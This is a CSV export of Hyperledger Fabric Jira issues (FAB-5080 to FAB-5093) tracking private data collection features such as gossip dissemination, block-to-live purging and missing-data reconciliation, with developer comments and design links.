Summary,Issue key,Issue id,Parent id,Issue Type,Status,Project key,Project name,Project type,Project lead,Project description,Project url,Priority,Resolution,Assignee,Reporter,Creator,Created,Updated,Last Viewed,Resolved,Affects Version/s,Affects Version/s,Affects Version/s,Fix Version/s,Fix Version/s,Component/s,Component/s,Component/s,Component/s,Component/s,Due Date,Votes,Labels,Labels,Labels,Labels,Labels,Labels,Description,Environment,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Log Work,Log Work,Original Estimate,Remaining Estimate,Time Spent,Work Ratio,Σ Original Estimate,Σ Remaining Estimate,Σ Time Spent,Security Level,Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Inward issue link (Cloners),Inward issue link (Cloners),Inward issue link (Cloners),Outward issue link (Cloners),Inward issue link (Duplicate),Inward issue link (Duplicate),Inward issue link (Duplicate),Outward issue link (Duplicate),Outward issue link (Duplicate),Inward issue link (Relates),Inward issue link (Relates),Inward issue link (Relates),Inward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Custom field (Business Value),Custom field (Commit Levels),Custom field (Current Status),Custom field (Design),Custom field (Design Status),Custom field (Documentation Impact),Custom field (Documentation Status),Custom field (Epic Color),Custom field (Epic Link),Custom field (Epic Name),Custom field (Epic Status),Custom field (Executed),Custom field (Found in Commit),Custom field (Function Test Status),Custom field (Must Fix),Custom field (Original story points),Custom field (Parent Link),Custom field (Rank),Custom field (Release Note),Custom field (Release Note Required),Custom field (Root Cause Analysis),Custom field (SDK Impact),Custom field (Sample/Tutorial),Sprint,Sprint,Sprint,Sprint,Custom field (Steps to Reproduce),Custom field (Story Points),Custom field (System Test Impact),Custom field (Target end),Custom field (Target start),Custom field (Team),Custom field (Team),Custom field (Test Plan),Custom field (Test Result),Custom field (Test Result Details),Custom field (Test Type),Custom field (Triaged),Custom field (Usage),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Workaround),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitCommitsReferenced),Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment
P1 - Chaincode API support for private data partitions,FAB-5080,18788,,Story,Closed,FAB,Fabric,software,denyeart,,,High,Done,Senthil1,denyeart,denyeart,29/Jun/17 8:14 PM,21/Jul/18 3:57 AM,28/Oct/23 3:00 AM,21/Oct/17 3:17 AM,,,,,,fabric-peer,,,,,,0,,,,,,,,,denyeart,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FABCN-270,FABCN-23,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-1151,,,,,,,,,"1|hzy68f:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"05/Jul/17 10:35 PM;denyeart;[~return_01], 

Senthil is already working on this one.  If you'd like to help on private data, please read through the high level design

[https://docs.google.com/document/d/1ShrgrYPWLznZSZrl5cnvmFq9LtLJ3tYUxjv9GN6rxuI/edit# |https://docs.google.com/document/d/1ShrgrYPWLznZSZrl5cnvmFq9LtLJ3tYUxjv9GN6rxuI/edit]

and let us know your experience in these areas.;;;","21/Oct/17 3:17 AM;denyeart;https://gerrit.hyperledger.org/r/#/c/12257/;;;","28/Mar/18 6:56 PM;Senthil1;[~return_01] Refer to chaincode examples given in [https://github.com/hyperledger/fabric/tree/release-1.1/examples/chaincode/go] and https://jira.hyperledger.org/browse/FAB-6600;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
P1 - State transfer of blocks to include associated private data,FAB-5081,18789,,Story,Closed,FAB,Fabric,software,denyeart,,,High,Done,C0rWin,denyeart,denyeart,29/Jun/17 8:16 PM,21/Jul/18 3:56 AM,28/Oct/23 3:00 AM,07/Sep/17 6:51 PM,,,,,,fabric-gossip,,,,,,0,active,gossip,,,,,"The goal of this task is to extend state transfer capabilities to enable it to replicated private data of transactions, which is distributed out of the ordering service scope.",,C0rWin,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Jul/17 11:53 PM;C0rWin;request missing blocks v2.pdf;https://jira.hyperledger.org/secure/attachment/11782/request+missing+blocks+v2.pdf","27/Jul/17 11:53 PM;C0rWin;response state transfer block.pdf;https://jira.hyperledger.org/secure/attachment/11781/response+state+transfer+block.pdf",,,,,,,,,,,,,,,,Unset,,,FAB-1151,,,,,,,,,"1|hzy68n:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,C0rWin,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Aug/17 7:56 PM;C0rWin;Further progress is awaiting resolution of FAB-5780 [~denyeart] [~manish-sethi];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Side DB - Chaincode policy to map private data collections to authorized organizations,FAB-5082,18790,,Epic,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ellaki,denyeart,denyeart,29/Jun/17 8:44 PM,21/Jul/18 4:09 AM,28/Oct/23 3:00 AM,03/May/18 10:48 PM,,,,,,fabric-peer,,,,,10/Sep/19 12:00 AM,0,Release-planning-1.1-TechPreview,,,,,,"This item include a few work items to allow for collection definition within a chaincode's instantiation/deployment. At the first stage this is to be performed by doing changed to LSCC deploy arguments (P2). At later stage, when Resources configuration tree will be available, collection definition will be done as specified here FAB-6042. There will be a follow-up JIRA item to describe the way collection objects would be used in the implementation of PolicyStore/Parser in this case.

 

1. Define collection interface as abstraction to represent different collection organisation
 * Should include initialisation function that takes as input potentially secretly distributed parameters
 * Should be generic enough to cover any unlinkability property we want to add

 2. Define collection config object - done here [https://gerrit.hyperledger.org/r/#/c/13231/] 

 3. Enhance LSCC deploy to take as argument a set of collection config objects 

 4. Simplest implementation of collection object defined here [https://gerrit.hyperledger.org/r/#/c/12757/] and explained in pages 11/12 of this doc [https://docs.google.com/document/d/1xXl6KVeHusoQd7RsBmv_WTmVR6RrMmFRiyChVSB9DPA/edit?usp=sharing] to include
 * Collection name is the same across all collection state updates
 * Collection access policies and access are publicly visible and validatable

 5. Update ValidateLSCCInvocation for the two cases:
      - deploy validation to check correctness of the collections created
      - upgrade validation to reject changes to cc collections

 6. Implement PoicyStore/PolicyParser with simple lookups to stateDB, to retrieve collections’ policies 

 

 

Flows for chaincode instantiation using the endorsement model:

!image-2017-10-03-13-55-33-325.png!  

 Chaincode upgrade flow:

!image-2017-10-03-13-56-35-939.png!

 

Endorser flow for chaincode that writes to a collection:

!image-2017-10-03-13-56-55-498.png!",,denyeart,guillaume.a,Joseph580307,SjirNijssen,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-6212,FAB-6213,FAB-5730,,,FABG-440,,,,FAB-1151,,,,,,,,,,,,"03/Oct/17 8:55 PM;elli-androulaki;image-2017-10-03-13-55-33-325.png;https://jira.hyperledger.org/secure/attachment/12200/image-2017-10-03-13-55-33-325.png","03/Oct/17 8:56 PM;elli-androulaki;image-2017-10-03-13-56-35-939.png;https://jira.hyperledger.org/secure/attachment/12201/image-2017-10-03-13-56-35-939.png","03/Oct/17 8:56 PM;elli-androulaki;image-2017-10-03-13-56-55-498.png;https://jira.hyperledger.org/secure/attachment/12202/image-2017-10-03-13-56-55-498.png",,,,,,,,,,,,,,Unset,,Unset,,,P3 - Security in SideDB ,,,,Unset,,,,"1|hzy68v:",,,,Unset,Unset,,,,,,,,,,,,,,,,,,denyeart,guillaume.a,Joseph580307,SjirNijssen,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
P3 - Specify and enforce minimum number of (internal/external) peers private data must be disseminated to (endorsement-time sync send),FAB-5083,18791,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,denyeart,denyeart,29/Jun/17 8:50 PM,21/Jul/18 3:54 AM,28/Oct/23 3:00 AM,16/Oct/17 6:39 AM,,,,,,fabric-gossip,,,,,,0,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-1151,,,,,,,,,"1|hzy693:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"16/Oct/17 6:39 AM;denyeart;This was done in https://gerrit.hyperledger.org/r/#/c/13877/.

Changing from internal/external policy to requiredPeerCount/maximumPeerCount in [https://gerrit.hyperledger.org/r/#/c/14517/.]  The dissemination will do best-effort to spray the private data to all the organizations that are members of the collection, to at least the required number of peers and at most the maximum number of peers.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"P2 - Gossip (push) dissemination of private data at endorsement time, to at least N other peers, so that peers will likely have private data by validation/commit timeve the private data ",FAB-5084,18792,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,C0rWin,denyeart,denyeart,29/Jun/17 8:53 PM,21/Jul/18 3:56 AM,28/Oct/23 3:00 AM,03/Oct/17 6:01 PM,,,,,,fabric-gossip,,,,,,0,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-1151,,,,,,,,,"1|hzy69b:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
P3 - Proceed with missing private data - Allow commit of transaction even if private data cannot be retrieved,FAB-5085,18793,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,denyeart,denyeart,29/Jun/17 8:55 PM,21/Jul/18 3:57 AM,28/Oct/23 3:00 AM,09/Oct/17 6:59 PM,,,,,,fabric-peer,,,,,,0,,,,,,,,,denyeart,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-1151,,,,,,,,,"1|hzy69j:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"02/Oct/17 7:42 PM;yacovm;https://gerrit.hyperledger.org/r/#/c/14037/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
P2 - Ledger support for missing private data,FAB-5086,18794,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish-sethi,denyeart,denyeart,29/Jun/17 9:07 PM,21/Jul/18 3:56 AM,28/Oct/23 3:00 AM,24/Sep/17 12:53 AM,,,,,,fabric-ledger,,,,,,0,,,,,,,"Private data may be missing for a variety of reasons:

1) Peer may not have access to private data

2) Peer did not previously have access to private data

3) Peer had access to private data, but couldn't find private data at validation time.  

This feature will check for missing private data at endorsement time and return error accordingly.

Also, since not all peers will have data to support validation of non-key queries, invalidate transactions that performed non-key queries.",,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-1151,,,,,,,,,"1|hzy69r:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"[sdk-node] Add the ""queryBlockByTxID"" method to the ""Channel"" class",FAB-5087,18795,,Task,Closed,FAB,Fabric,software,denyeart,,,Highest,Done,shumin1027,shumin1027,shumin1027,29/Jun/17 9:09 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,03/Mar/18 11:07 AM,v1.0.0,,,v1.1.0,,fabric-sdk-node,,,,,,0,,,,,,,"Add the ""queryBlockByTxID"" method to the ""Channel"" class to support query the block info by 

transactionID",,davidkhala,harrisob@us.ibm.com,mastersingh24,shumin1027,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5120,,,,,,,,,,,,,,,,,,,,,,,FABN-646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy69z:",,,,,,,,,,,,,,,,,,,,,,,davidkhala,harrisob@us.ibm.com,mastersingh24,shumin1027,,,,,,,,,,,,,,,,,,,,,,,,,,,dev,main,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"13/Jul/17 2:54 AM;jimthematrix;https://gerrit.hyperledger.org/r/#/c/11301;;;","14/Jul/17 6:31 PM;mastersingh24;We should not be adding new APIs in a patch release - the target for this should be 1.1;;;","01/Mar/18 11:17 AM;davidkhala;[~shumin1027]

I would like to cooperate with you on that. Keep posted.;;;","03/Mar/18 5:07 AM;harrisob@us.ibm.com;https://gerrit.hyperledger.org/r/#/c/11609/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"P2 - Gossip (pull) request for private data at validation time, to retrieve private data if it is not yet available on peer upon validation",FAB-5088,18796,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,denyeart,denyeart,29/Jun/17 9:11 PM,21/Jul/18 3:57 AM,28/Oct/23 3:00 AM,16/Oct/17 6:26 AM,,,,,,fabric-gossip,,,,,,0,,,,,,,,,C0rWin,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5971,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-1151,,,,,,,,,"1|hzy6af:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,C0rWin,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"10/Sep/17 6:51 AM;C0rWin;The work required for this items captured by FAB-5971;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
P3 - Chaincode retention policy for transient private data (block-to-live policy),FAB-5089,18797,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,denyeart,denyeart,29/Jun/17 9:13 PM,21/Jul/18 3:54 AM,28/Oct/23 3:00 AM,16/Oct/17 6:33 AM,,,,,,fabric-peer,,,,,,0,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-1151,,,,,,,,,"1|hzy6an:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Oct/17 6:33 AM;denyeart;Implemented as core.yaml config option transientstoreMaxBlockRetention. Done in FAB-5091.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
P3 - Chaincode retention policy for private state data (block-to-live policy),FAB-5090,18798,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,denyeart,denyeart,29/Jun/17 9:14 PM,21/Jul/18 3:57 AM,28/Oct/23 3:00 AM,04/May/18 3:01 AM,,,,,,fabric-peer,,,,,,0,,,,,,,Need to specify a block-to-live policy in the collection configuration for private data.,,denyeart,jiangyaoguo,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5092,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-1151,,,,,,,,,"1|hzy6av:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,jiangyaoguo,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"06/Nov/17 8:47 PM;denyeart;This is currently implemented as a core.yaml property per collection.  Once FAB-6042 is complete, this will be added to the collection configuration under the chaincode configuration in the channel-scoped peer config.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"P3 - Coordinator purge from private transient db based on block-to-live (BTL) policy, for orphaned transactions ",FAB-5091,18799,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,denyeart,denyeart,29/Jun/17 9:15 PM,21/Jul/18 3:55 AM,28/Oct/23 3:00 AM,16/Oct/17 6:31 AM,,,,,,fabric-ledger,,,,,,0,,,,,,,"Need to purge from transient store any orphaned private write sets for transactions that never got submitted for ordering/commit.

Since these records are stored by tx id rather than by collection, the block-to-live policy should not be at collection level, rather it should be at the peer level (core.yaml).",,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-1151,,,,,,,,,"1|hzy6b3:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Ledger purge from private state db and write set storage based on block-to-live (BTL) policy,FAB-5092,18800,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish-sethi,denyeart,denyeart,29/Jun/17 9:16 PM,21/Jul/18 3:57 AM,28/Oct/23 3:00 AM,03/May/18 10:52 AM,,,,v1.2.0,,fabric-ledger,,,,,15/Oct/17 12:00 AM,1,,,,,,,,,C0rWin,denyeart,troyronda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-1526,FAB-5090,,,,FAB-5096,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-8718,,,,,,,,,"1|hzwsuv:",,,,Unset,,Sprint 7 - NextGen Endorsement,,,,,,Unset,,,,,,,,,,,C0rWin,denyeart,troyronda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Reconcile missing private data on peers that are authorized to have it,FAB-5093,18801,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,nirro,denyeart,denyeart,29/Jun/17 9:19 PM,08/Dec/18 1:06 PM,28/Oct/23 3:00 AM,08/Dec/18 1:06 PM,,,,v1.4.0,,fabric-gossip,fabric-ledger,,,,,1,,,,,,,"Stories:

As an organization that has recently been added to a collection via a chaincode upgrade, I would like to automatically receive the prior private data for the collection, so that I can query and endorse future transactions.

As an organization that has access to a collection but couldn't retrieve private data when it was initially committed time, I would like to automatically receive the prior private data for the collection, so that I can query and endorse future transactions.

 

High - level design doc - https://docs.google.com/document/d/16OzAAc-JoxSUDHVva3AYuj_MzslAtoXOGcbjSIwUqUg/edit",,C0rWin,denyeart,manish-sethi,nirro,troyronda,wutongtree,yacovm,ymlbright,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5096,,,,FAB-10599,FAB-11301,FAB-11302,FAB-11323,FAB-11324,FAB-11772,FAB-11773,FAB-11774,FAB-11780,FAB-12000,FAB-12551,FAB-13147,,,,,,,,,,,,,,,,,,Unset,,,FAB-5108,,,,,,,,,"1|hzwzxr:","Missing private data reconciliation is a new feature for v1.4 that requires bookkeeping at commit time.
Existing v1.2 or v1.3 peers that have missing private data will not be able to reconcile their existing missing private data. A new v1.4 peer will need to be brought up and join the channel so that the bookkeeping can be tracked from the genesis block onwards.",Yes,,Unset,,Next Items- Ledger,,,,,,Unset,,,,,"[Nir and Manish to add integration test plan, and collaborate with Rajesh on system test plan.]
SVT test prime: Rajesh Lalgowdar 


System test ideas:
Add a new peer to a channel with a large amount of private data history, ensure it can reconcile old private data efficiently.
Add an existing peer to a new collection with a large amount of private data history, ensure it can reconcile old private data efficiently.
Ensure that peers can now endorse against old private data.",,,,,,C0rWin,denyeart,manish-sethi,nirro,troyronda,wutongtree,yacovm,ymlbright,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"10/Jan/18 11:03 AM;troyronda;Would this be needed when a policy update adds an organization to a collection (via FAB-5096)?

Copied this comment from FAB-5096:
 * Ability for _a joining organization to retrieve a copy of existing collection data_. In cases where an organization is granted access to data covered by one or more policies, they should have the ability to replicate the existing data to their peers from other (willing) organization(s)’ peers, as a capability of Fabric.;;;","24/Jul/18 12:04 AM;manish-sethi;High - level design doc - https://docs.google.com/document/d/16OzAAc-JoxSUDHVva3AYuj_MzslAtoXOGcbjSIwUqUg/edit
 [~nirro] - will add sequence diagrams to this.;;;","24/Jul/18 5:42 PM;nirro;https://docs.google.com/document/d/16OzAAc-JoxSUDHVva3AYuj_MzslAtoXOGcbjSIwUqUg/edit?usp=sharing;;;","25/Aug/18 9:47 PM;denyeart;Split into two stories:
FAB-11301 for gossip side.
FAB-11302 for ledger side.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
